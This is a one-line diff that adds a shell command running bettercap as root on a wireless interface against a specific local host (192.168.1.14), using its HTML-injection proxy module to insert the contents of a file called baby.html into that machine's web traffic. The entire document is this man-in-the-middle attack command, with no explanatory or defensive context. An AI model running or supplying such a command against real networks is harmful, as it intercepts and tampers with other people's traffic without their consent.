@@ -1,0 +1,1 @@
+sudo bettercap -I wlan0 -T 192.168.1.14 --proxy-module injecthtml --html-file baby.html
